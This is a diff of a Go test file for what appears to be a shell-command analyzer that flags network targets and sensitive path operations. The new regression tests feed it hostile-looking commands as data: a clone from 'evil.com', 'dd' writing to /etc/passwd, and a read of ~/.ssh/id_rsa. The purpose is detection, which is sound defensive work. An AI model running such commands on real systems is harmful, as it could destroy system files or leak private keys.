@@ -151,45 +151,51 @@ func TestCoverrules_AnalyzeShell_RedirectionParseError(t *testing.T) {
 }
 
 func TestCoverrules_IsNetworkSubcommand_GitVariants(t *testing.T) {
-	var empty analysis
-	require.False(t, isNetworkSubcommand("git", &empty))
+	require.False(t, isNetworkSubcommand(nil))
 
-	clone := analyzeShell("git clone github.com/org/repo")
-	require.True(t, isNetworkSubcommand("git", &clone))
-
-	status := analyzeShell("git status")
-	require.False(t, isNetworkSubcommand("git", &status))
+	require.True(t, isNetworkSubcommand([]string{"git", "clone", "github.com/org/repo"}))
+	require.False(t, isNetworkSubcommand([]string{"git", "status"}))
 
 	// Flags before the subcommand are skipped.
-	flagged := analyzeShell("git -C /tmp status")
-	require.False(t, isNetworkSubcommand("git", &flagged))
+	require.False(t, isNetworkSubcommand([]string{"git", "-C", "/tmp", "status"}))
 
 	// A valueless flag is skipped; the fetch subcommand still counts.
-	flaggedClone := analyzeShell("git --bare fetch origin")
-	require.True(t, isNetworkSubcommand("git", &flaggedClone))
+	require.True(t, isNetworkSubcommand([]string{"git", "--bare", "fetch", "origin"}))
 
 	// Non-git network commands treat any bare host as a target.
-	require.True(t, isNetworkSubcommand("curl", &status))
-
-	// Multi-segment pipelines skip non-git segments.
-	mixed := analyzeShell("echo x | git clone github.com/org/repo")
-	require.True(t, isNetworkSubcommand("git", &mixed))
-
-	// A pipeline without any git segment finds no subcommand.
-	nogit := analyzeShell("echo x | ls /tmp")
-	require.False(t, isNetworkSubcommand("git", &nogit))
+	require.True(t, isNetworkSubcommand([]string{"curl", "github.com"}))
 }
 
-func TestCoverrules_ClassifyToken_EnvFlagWithEquals(t *testing.T) {
-	var a analysis
-	classifyToken(&a, "env", "-u=HOME")
-	require.Equal(t, []string{"-u"}, a.EnvNames)
+// TestCoverrules_IsNetworkSubcommand_PerSegment is the X5 regression: in
+// `git status && git clone evil.com/x` the clone argument must be judged
+// against its own segment, not the first segment of the pipeline.
+func TestCoverrules_IsNetworkSubcommand_PerSegment(t *testing.T) {
+	a := analyzeShell("git status && git clone evil.com/x")
+	require.NoError(t, a.ParseError)
+	found := false
+	for _, tgt := range a.NetworkTargets {
+		if tgt.Host == "evil.com" {
+			found = true
+		}
+	}
+	require.True(t, found,
+		"bare host of the second git segment must be a network target; targets=%+v",
+		a.NetworkTargets)
 }
 
 func TestCoverrules_ClassifyToken_GitCloneBareHost(t *testing.T) {
 	a := analyzeShell("git clone github.com/org/repo")
 	require.NotEmpty(t, a.NetworkTargets)
 	require.Equal(t, "github.com", a.NetworkTargets[0].Host)
+}
+
+// TestCoverrules_ClassifyToken_KeyValuePathToken is the X12 regression:
+// `dd of=/etc/passwd` must classify the value of the key=value token as
+// a path-like argument.
+func TestCoverrules_ClassifyToken_KeyValuePathToken(t *testing.T) {
+	a := analyzeShell("dd if=x of=/etc/passwd count=1")
+	require.Contains(t, a.PathOps,
+		pathOp{Token: "/etc/passwd", Op: "write", Executable: "dd"})
 }
 
 func TestCoverrules_ClassifyToken_GitCloneAmbiguousHostSkipped(t *testing.T) {
@@ -250,6 +256,16 @@ func TestCoverrules_ExtractNetworkTarget(t *testing.T) {
 		require.False(t, tgt.Malformed)
 		require.Equal(t, "example.com", tgt.Host)
 	})
+	t.Run("SCP-like user prefix is stripped", func(t *testing.T) {
+		tgt := extractNetworkTarget("git@github.com:org/repo.git")
+		require.False(t, tgt.Malformed)
+		require.Equal(t, "github.com", tgt.Host)
+	})
+	t.Run("single trailing dot is trimmed", func(t *testing.T) {
+		tgt := extractNetworkTarget("github.com.")
+		require.False(t, tgt.Malformed)
+		require.Equal(t, "github.com", tgt.Host)
+	})
 	t.Run("localhost is malformed", func(t *testing.T) {
 		tgt := extractNetworkTarget("localhost")
 		require.True(t, tgt.Malformed)
@@ -301,6 +317,44 @@ func TestCoverrules_MergeAnalysis_PreservesHashAndSummary(t *testing.T) {
 	require.Equal(t, "summary", a.CommandSummary)
 	require.Equal(t, int64(5), a.SleepSeconds)
 	require.Equal(t, shell.Source, a.Source)
+}
+
+// TestCoverrules_MergeAnalysis_ParseFailureIsSticky is the X1 regression:
+// a later successful parse must not erase an earlier parse failure, and
+// the merged pipeline must stay nil so the raw-source fallbacks engage.
+func TestCoverrules_MergeAnalysis_ParseFailureIsSticky(t *testing.T) {
+	a := analysis{SleepSeconds: -1}
+
+	bad := analyzeShell("cat ~/.ssh/id_rsa; echo $HOME")
+	require.Error(t, bad.ParseError)
+	mergeAnalysis(&a, &bad)
+	require.Error(t, a.ParseError)
+	require.Nil(t, a.Pipeline)
+	require.True(t, a.HasSubstitution)
+
+	good := analyzeShell("ls")
+	require.NoError(t, good.ParseError)
+	mergeAnalysis(&a, &good)
+	require.Error(t, a.ParseError,
+		"a later successful parse must not erase an earlier failure")
+	require.Nil(t, a.Pipeline,
+		"pipeline must stay nil so raw-source fallbacks engage")
+	// The failed block's source must survive for the raw-source scans.
+	require.Contains(t, a.Source, "id_rsa")
+}
+
+// TestCoverrules_MergeAnalysis_SuccessfulPipelinesAccumulate verifies
+// that two successful merges concatenate pipeline segments instead of
+// the later one replacing the earlier one.
+func TestCoverrules_MergeAnalysis_SuccessfulPipelinesAccumulate(t *testing.T) {
+	a := analysis{SleepSeconds: -1}
+	first := analyzeShell("ls /tmp")
+	second := analyzeShell("cat /etc/hostname")
+	mergeAnalysis(&a, &first)
+	mergeAnalysis(&a, &second)
+	require.NoError(t, a.ParseError)
+	require.NotNil(t, a.Pipeline)
+	require.Len(t, a.Pipeline.Commands, 2)
 }
 
 func TestCoverrules_IsGitSubcommandName(t *testing.T) {
